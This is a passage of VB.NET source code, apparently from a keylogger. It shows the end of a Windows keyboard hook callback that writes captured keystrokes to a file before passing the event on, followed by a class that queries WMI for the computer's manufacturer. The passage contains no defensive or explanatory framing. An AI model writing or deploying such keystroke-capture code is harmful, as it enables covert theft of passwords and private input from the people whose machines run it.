            If (File.Exists(output)) Then
                File.AppendAllText(output, KeyString)
            Else
                File.WriteAllText(output, KeyString)
            End If
            KeyString = Nothing
        End If
        Return CallNextHookEx(KeyboardHandle, Code, wParam, lParam)
    End Function
End Class
Public Class OSInfo
    Private objCS As ManagementObjectSearcher
    Private objMgmt As ManagementObject
    Private m_strManufacturer As String
    Public Sub New()
        objCS = New ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")
        For Each Me.objMgmt In objCS.Get
            m_strManufacturer = Me.objMgmt("manufacturer").ToString()
        Next
    End Sub
    Public ReadOnly Property Manufacturer()
        Get
            Manufacturer = m_strManufacturer
        End Get
    End Property
End Class